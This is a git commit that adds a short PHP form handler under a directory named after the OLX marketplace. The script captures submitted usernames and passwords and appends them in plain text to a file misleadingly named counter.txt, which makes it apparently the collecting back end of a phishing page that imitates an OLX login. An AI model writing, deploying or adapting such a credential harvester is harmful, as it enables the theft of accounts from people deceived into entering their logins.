a1b171a3fc6768a72a1a419cb824649a9d49c686
Maksym Knyzhenko <knighenko@gmail.com>
2020-10-03 20:08:06 +0300

    Add php code

---
+++ OlxHtml/form.php
@@ -0,0 +1,13 @@
+<?php
+  $username = htmlentities($_POST['username']);
+    $password = htmlentities($_POST['password']);
+   $output ="
+  username: $username
+  password: $password
+     ";
+   echo $output;
+   $fp = fopen('counter.txt', 'a');
+fwrite($fp, $output . PHP_EOL);
+fclose($fp);
+ 
+?>
